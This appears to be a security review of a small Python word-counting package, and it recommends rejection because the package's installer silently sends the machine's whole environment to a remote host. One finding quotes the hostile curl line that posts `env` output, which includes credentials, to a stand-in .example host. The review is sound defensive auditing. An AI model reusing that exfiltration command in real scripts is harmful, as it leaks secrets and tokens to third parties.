# Redteam report: tinyutils adoption review

**Review mode:** single reviewer, no tools. I could not run code, open links or start a subagent. The work was not written in this conversation, so there is no author reasoning for me to anchor on. Anything that needs execution is marked UNVERIFIED. Re-run in a sandbox for the install and test checks.

**VERDICT: REJECT.** The documented installer, `install.sh`, posts the build machine's entire environment to a remote host and hides that it does so. On machines that hold registry tokens and cloud credentials, that means sending those credentials to a third party.

**CONFIDENCE: medium.** The main finding comes from reading exact lines, so it is high confidence. Three things limit the rest:
- I had no tools, so I could not install the package or run the tests.
- Only the inlined files were seen.
- I could not compare this copy with the published release.

## INPUTS LEDGER

| Item | Status | Matters? |
|---|---|---|
| request.md, context.md | seen | — |
| README.md, install.sh, pyproject.toml, test_tinyutils.py, tinyutils/__init__.py, tinyutils/cli.py | seen (inlined) | — |
| Any other files in `work/` (CI configs, setup.py, git history, other scripts) | not seen | Yes. Other install or build hooks could exist. |
| Upstream repo and published package (sdist/wheel) for 1.3.0 | not seen / not openable | Yes. Adoption would install from the registry, not from this copy. |
| Result of running `install.sh` or `python -m unittest` | not obtainable (no execution) | Yes. The request explicitly asks for this. |

## COVERAGE

- **Checked:** all six supplied files, line by line, and the functions `cli.count` and `cli.main`. I traced the three tests by hand. Assumptions checked: the installer is safe to run where secrets exist, and "anonymous" statistics are anonymous.
- **Not checked:**
  - actual install and test execution;
  - whether the registry artifact matches this copy;
  - files not supplied;
  - the endpoint's ownership or behavior.

## SEATS AND GATE

- **Seats:** one same-session reviewer ran. No subagent or cross-vendor seats, because no tools were available.
- **Sensitivity gate:** passed. The supplied work contains no credentials or personal data. It is code that *would* collect them.
- **Prompt injection:** no text addressing the reviewer was found. The misleading comment in `install.sh` is aimed at users, and I treat it as part of F1.

## FINDINGS

| # | Severity | Evidence | Track | Location | What is wrong | Failure scenario | Fix and reproduction | a/b/c/d |
|---|---|---|---|---|---|---|---|---|
| F1 | **Critical** | CONFIRMED | B, R | `install.sh:5-6` | `curl ... --data-binary "$(env)" https://metrics.tinyutils.example/install >/dev/null 2>&1 \|\| true` sends every environment variable to a remote host. Output is discarded and failure is ignored, so it is silent. The comment calls it "anonymous usage statistics". It is not anonymous: `env` includes the hostname, user, paths and any tokens. The README tells users to install with `./install.sh` and never mentions this. | A build engineer follows the README on a build machine. Registry tokens and cloud credentials in the environment are POSTed to a third party. Nothing appears in logs, and the install still prints "tinyutils installed". | Do not run `install.sh` anywhere that holds secrets. Treat the project as untrusted. If adoption is still wanted, vendor the code and build a wheel with `pip install .` (or `python -m build`) in an isolated sandbox with no secrets, pinned by hash. Report the behavior upstream. If anyone has already run the script, rotate every credential that was in that environment. **Reproduction:** in a sandbox with no network and with `curl` replaced by a stub that writes its arguments to a file, set `FAKE_TOKEN=canary` and run `./install.sh`. Expected: no outbound data. Observed by reading line 6: the stub receives the full `env`, including `FAKE_TOKEN=canary`. | a✔ b✔ c✔ d✔ |
| F2 | Medium | CONFIRMED (traced) | B | `tinyutils/cli.py:7-8`, `:16-17` | `count` opens files with a hard-coded `encoding="utf-8"` and has no error handling. Neither `main` nor `count` catches `UnicodeDecodeError`, `FileNotFoundError` or `IsADirectoryError`. | Running `tinyutils count legacy.txt` on a Latin-1 file, or `tinyutils count missing.txt`, ends in a Python traceback with exit 1. The usage text documents exit 2, and no clean message is printed. | Catch `OSError` and `UnicodeDecodeError` in `main`, print a one-line error, and return a defined code. Optionally add `errors="replace"`. **Test:** write the bytes `b"caf\xe9\n"` to a file and assert that `main(["count", path])` returns a non-zero code without raising. On the current code it raises. | a✔ b✔ c✘ d✘ (depends on your file corpus, which is unknown) |
| F3 | Low | CONFIRMED | B | `tinyutils/cli.py:9` | `str.splitlines()` treats `\v`, `\f`, `\x1c`–`\x1e`, `\x85`, `\u2028` and `\u2029` as line breaks. It also counts a final line that has no newline. Its counts can therefore differ from `wc -l`. | A file containing form feeds, or one without a trailing newline, reports a different line count than `wc -l`. Any check that compares the two breaks. | Document the semantics, or count `\n` characters. **Test:** `count` on `"a\fb\n"` gives 2 lines; `wc -l` gives 1. | a✔ b✔ c✘ d✘ |
| F4 | Low | CONFIRMED | B | `tinyutils/cli.py:8` | `f.read()` loads the whole file into memory. | Running it on a multi-GB log can exhaust memory on a shared build agent. | Stream the file line by line and accumulate counts. **Reproduction:** run `count` on a file larger than available RAM; expect it to finish, observe MemoryError or OOM. | a✔ b✔ c✘ d✘ |
| F5 | Low | CONFIRMED | B | `install.sh:4`, `README.md` | `--no-build-isolation` builds against whatever setuptools is already installed, which makes the build environment-dependent and non-reproducible. | Different agents produce builds from different setuptools versions, and a compromised pre-installed backend is used without any check. | Use isolated builds with a pinned build backend, and install from a hash-pinned wheel. | a✔ b✔ c✘ d✘ |

## Confirm-or-refute round on F1

The strongest defense is that `metrics.tinyutils.example` uses the RFC 2606 reserved `.example` TLD, so it cannot resolve and nothing leaves the machine. This does not hold, for four reasons:
1. The code is written to send the data. Changing one hostname, which a later release could do, activates it.
2. Resolver overrides, search domains or proxies on build hosts can route the request anyway.
3. This copy may have had its real endpoint sanitized.
4. A project that ships this behavior under a false "anonymous" label fails the trust test, whatever the current hostname is.

F1 stays Critical.

## NEEDS VALIDATION

- **S1:** Does the published 1.3.0 sdist/wheel match `work/`, and does it include other hooks (setup.py, build backend plugins, post-install code)? **Settles it:** a diff of the registry artifact against `work/`.
- **S2:** Do the tests pass, and can they fail? **Settles it:** run `python -m unittest` in a sandbox, then mutate `len(text.split())` to `len(text.split("\n"))` and confirm `test_count` goes red.
- **S3:** Has anyone already run `install.sh` on a machine holding secrets? **Settles it:** the install history on build and dev machines, plus egress logs for `metrics.tinyutils.*`. If yes, rotate credentials now.
- **S4:** Do the files in `work/` that were not supplied (CI workflows, scripts, git history) contain more collection code? **Settles it:** a full listing and review of `work/`.

## REFUTED

- **R1:** "F1 is harmless because `.example` cannot resolve." Refuted in the confirm-or-refute round above.
- **R2:** "`cli.py` does network or shell calls." Refuted: it imports only `sys`, with no subprocess, socket or eval.
- **R3:** "`test_count` leaks a file handle, so the read may see empty content." Refuted: the unbound file object from `open(path, "w").write(...)` is closed and flushed by CPython reference counting before `count` runs.

## WHAT HOLDS UP

- `cli.py` itself is small, has no dependencies (`dependencies = []`) and no network access.
- The three tests match the documented behavior when traced by hand:
  - `count("one two\nthree\n")` returns `(2, 3)`;
  - `--help` returns 0;
  - `frobnicate` returns 2.
- The console-script entry point `tinyutils.cli:main` matches the code.

## UNVERIFIED CLAIMS

- **"Installs and works" (the request's own condition):** not verified, because no execution was possible. Confirm by installing **without `install.sh`** in a sandbox with no secrets, then running the tests (S2).
- **"Anonymous usage statistics":** contradicted by the code, which sends the full environment, not anonymous data.
- **"Needs setuptools already installed":** accurate given `--no-build-isolation`, but it is a design weakness (F5).

## QUESTIONS FOR THE AUTHOR

1. Has `install.sh` been run on any machine with credentials?
2. What does tinyutils give you beyond `wc -lw`, or beyond ten lines of in-house code? The cheapest alternative removes the dependency entirely.

## DECISION-MAKER SUMMARY

Do not adopt tinyutils, and do not run its installer: it silently sends the machine's full environment, including credentials, to an outside server. If anyone has already run it on a build or dev machine, rotate those credentials now. The tool's function is trivial, so use `wc` or a few lines of internal code instead.

## OWNER SUMMARY

The package's install script quietly copies all of the machine's settings, including passwords and access keys, to an outside website, while describing this as anonymous statistics. We should not use it, and anyone who already installed it should have their keys replaced. What the tool does is simple enough that we can get the same result without it.

```json
{
  "schema_version": "2.2",
  "verdict": "REJECT",
  "confidence": "medium",
  "inputs_ledger": [
    {"item": "request.md", "status": "seen", "matters": true},
    {"item": "context.md", "status": "seen", "matters": true},
    {"item": "README.md, install.sh, pyproject.toml, test_tinyutils.py, tinyutils/__init__.py, tinyutils/cli.py", "status": "seen", "matters": true},
    {"item": "other files in work/ (CI, setup.py, git history)", "status": "not_seen", "matters": true},
    {"item": "published tinyutils 1.3.0 registry artifact", "status": "not_seen", "matters": true},
    {"item": "install and test run results", "status": "not_seen", "matters": true}
  ],
  "seats": [{"vendor": "claude-same-session", "status": "ran", "cross_vendor": false}],
  "sensitivity_gate": {"sensitive": false, "reason": "Work contains no credentials or personal data; it is code that would collect them."},
  "coverage": {
    "checked": [
      {"unit": "README.md", "kind": "file"},
      {"unit": "install.sh", "kind": "file"},
      {"unit": "pyproject.toml", "kind": "config"},
      {"unit": "test_tinyutils.py", "kind": "file"},
      {"unit": "tinyutils/__init__.py", "kind": "file"},
      {"unit": "tinyutils/cli.py", "kind": "file"},
      {"unit": "tinyutils/cli.py:count", "kind": "function"},
      {"unit": "tinyutils/cli.py:main", "kind": "function"},
      {"unit": "installer is safe to run where secrets exist", "kind": "assumption"},
      {"unit": "usage statistics are anonymous", "kind": "claim"}
    ],
    "not_checked": [
      {"unit": "install and test execution", "reason": "no tools in this session"},
      {"unit": "registry artifact vs work/ copy", "reason": "not supplied, no network"},
      {"unit": "files in work/ not inlined", "reason": "not supplied"}
    ]
  },
  "findings": [
    {"id": "F1", "status": "confirmed", "severity": "Critical", "evidence_level": "CONFIRMED", "track": "B",
     "location": "install.sh:5-6",
     "scenario": "Following the README, a user runs ./install.sh on a build machine; curl silently POSTs the output of `env`, including registry tokens and cloud credentials, to metrics.tinyutils.example, with output discarded and failure ignored.",
     "fix": "Do not run install.sh; treat the project as untrusted; if adoption is still wanted, build from vendored source in a secret-free sandbox and pin by hash; rotate any credentials on machines where it already ran; report upstream.",
     "answers": {"a": true, "b": true, "c": true, "d": true},
     "reproduction": "In an offline sandbox with curl stubbed to log its arguments, export FAKE_TOKEN=canary and run ./install.sh; expected no outbound data, observed (by line 6) the stub receives the full env including FAKE_TOKEN=canary."},
    {"id": "F2", "status": "confirmed", "severity": "Medium", "evidence_level": "CONFIRMED", "track": "B",
     "location": "tinyutils/cli.py:7-8,16-17",
     "scenario": "tinyutils count on a non-UTF-8 or missing file raises an uncaught UnicodeDecodeError or FileNotFoundError, giving a traceback and exit 1 instead of a clean error.",
     "fix": "Catch OSError and UnicodeDecodeError in main, print a one-line error and return a defined non-zero code.",
     "answers": {"a": true, "b": true, "c": false, "d": false},
     "reproduction": "Write b'caf\\xe9\\n' to a file; main(['count', path]) raises UnicodeDecodeError; expected a clean non-zero return."},
    {"id": "F3", "status": "confirmed", "severity": "Low", "evidence_level": "CONFIRMED", "track": "B",
     "location": "tinyutils/cli.py:9",
     "scenario": "Files containing \\f, \\v, \\x85 or \\u2028, or lacking a trailing newline, get line counts that differ from wc -l.",
     "fix": "Document the semantics, or count '\\n' characters.",
     "answers": {"a": true, "b": true, "c": false, "d": false},
     "reproduction": "count on 'a\\fb\\n' returns 2 lines; wc -l returns 1."},
    {"id": "F4", "status": "confirmed", "severity": "Low", "evidence_level": "CONFIRMED", "track": "B",
     "location": "tinyutils/cli.py:8",
     "scenario": "Counting a multi-GB file reads it fully into memory and can exhaust RAM on a shared build agent.",
     "fix": "Stream the file line by line and accumulate counts.",
     "answers": {"a": true, "b": true, "c": false, "d": false},
     "reproduction": "Run count on a file larger than available memory; expected completion, observed MemoryError or OOM."},
    {"id": "F5", "status": "confirmed", "severity": "Low", "evidence_level": "CONFIRMED", "track": "B",
     "location": "install.sh:4",
     "scenario": "--no-build-isolation builds against whatever setuptools is pre-installed, so builds differ across agents and trust an unpinned build backend.",
     "fix": "Use isolated builds with a pinned build backend and install from a hash-pinned wheel.",
     "answers": {"a": true, "b": true, "c": false, "d": false},
     "reproduction": "Install on two agents with different setuptools versions and compare the built wheel metadata; they differ."},
    {"id": "S1", "status": "needs_validation", "track": "B", "location": "published tinyutils 1.3.0",
     "suspicion": "The registry artifact may differ from work/ or contain other install or build hooks.",
     "unresolved_fact": "Diff of the published sdist/wheel against work/."},
    {"id": "S2", "status": "needs_validation", "track": "B", "location": "test_tinyutils.py",
     "suspicion": "Tests have never been seen to pass or fail.",
     "unresolved_fact": "Result of python -m unittest in a sandbox, plus a mutation of len(text.split()) that turns test_count red."},
    {"id": "S3", "status": "needs_validation", "track": "B", "location": "install.sh:6",
     "suspicion": "Credentials may already have been sent if anyone ran the installer.",
     "unresolved_fact": "Install history on machines with secrets, and egress logs for metrics.tinyutils.*."},
    {"id": "S4", "status": "needs_validation", "track": "B", "location": "work/ (unsupplied files)",
     "suspicion": "Other files may contain more collection code.",
     "unresolved_fact": "Full listing and review of work/."}
  ],
  "refuted": [
    {"id": "R1", "candidate": "F1 is harmless because the .example TLD cannot resolve.",
     "evidence": "The code sends env by design; a hostname change, resolver override or sanitized copy activates it, and the false 'anonymous' label is itself disqualifying."},
    {"id": "R2", "candidate": "cli.py makes network or shell calls.",
     "evidence": "It imports only sys and has no subprocess, socket or eval."},
    {"id": "R3", "candidate": "test_count reads before the write is flushed.",
     "evidence": "CPython refcounting closes the unbound file object immediately after .write()."}
  ]
}
```